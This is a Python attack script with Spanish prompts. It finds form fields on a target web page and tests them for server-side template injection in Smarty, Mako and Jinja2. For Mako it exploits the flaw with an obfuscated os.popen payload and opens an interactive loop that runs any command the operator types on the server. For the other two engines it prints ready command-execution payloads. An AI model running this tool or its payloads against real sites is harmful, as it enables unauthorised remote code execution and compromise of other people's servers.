import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import os

def clear():
    os.system("cls" if os.name == "nt" else "clear")

TIMEOUT = 5

def discover_inputs(url):
    r = requests.get(url, timeout=TIMEOUT)
    soup = BeautifulSoup(r.text, "html.parser")

    targets = []

    for form in soup.find_all("form"):
        action = form.get("action", "")
        method = form.get("method", "get").lower()
        full_action = urljoin(url, action)

        for inp in form.find_all("input"):
            name = inp.get("name")
            if name:
                targets.append((full_action, method, name))

    return targets

def send(url, param, payload):
    return requests.get(url, params={param: payload}, timeout=TIMEOUT)

def test_ssti(url):
    print(f"[*] Testing {url}\n")

    targets = discover_inputs(url)
    if not targets:
        print("[-] No inputs encontrados")
        return

    for action, method, param in targets:
        print(f"[*] Probando input '{param}' en {action}")

        r = send(action, param, "${1348*6324}")
        if "8524752" in r.text:

            r = send(action, param, "azbhvjsisdawdsa{*comment*}asdjsdfhmsdfasd")
            if "azbhvjsisdawdsaasdjsdfhmsdfasd" in r.text and "comment" not in r.text:
                print(f"[+] SSTI Smarty")
                print("Pruebe {{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}} y vea el resultado obtenido.")
                return

            marker = "aazbhvjsisdawdsasazbhvjsisdawdsadazbhvjsisdawdsajazbhvjsisdawdsasazbhvjsisdawdsadazbhvjsisdawdsafazbhvjsisdawdsahazbhvjsisdawdsamazbhvjsisdawdsasazbhvjsisdawdsadazbhvjsisdawdsafazbhvjsisdawdsaaazbhvjsisdawdsasazbhvjsisdawdsad"

            r = send(action, param, '${"azbhvjsisdawdsa".join("asdjsdfhmsdfasd")}')
            if marker in r.text:
                print("[+] SSTI Mako")
                decision = input("Desea continuar y explotar el sistema verificando el comando 'id' introducido a traves de un payload predefinido (s/n): ")
                if decision.lower() != "s":
                    return
                clear()
                context = {
                    "action": action,
                    "param": param,
                }
                r2 = send(
                    context["action"],
                    context["param"],
                    '${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}'
                )

                print("[i] Output Payload '${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}' = id: ", r2.text)
                while True:
                    comando = str(input("Introduzca el comando que desea ejecutar para ver su resultado: "))
                    clear()
                    char = "'"
                    payload2 = "${self.module.cache.util.os.popen(" + char + "id && " + comando + char + ").read()}"
                    r2 = send(
                        context["action"],
                        context["param"],
                        payload2
                    )
                    print("[i] Output Payload id && ", payload2, ":", r2.text)
                    print(f"Busque en el output recibido el resultado del payload ejecutado.")
                return
        
            r = send(action, param, "${{1348*6324}}")
            if "8524752" in r.text:
                print(f"[+] SSTI Jinja2")
                print("Pruebe {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}} y vea el resultado obtenido.")
                return

    print("[-] No SSTI detectada")
    print(r.text)

if __name__ == "__main__":
    test_ssti(input("URL: "))
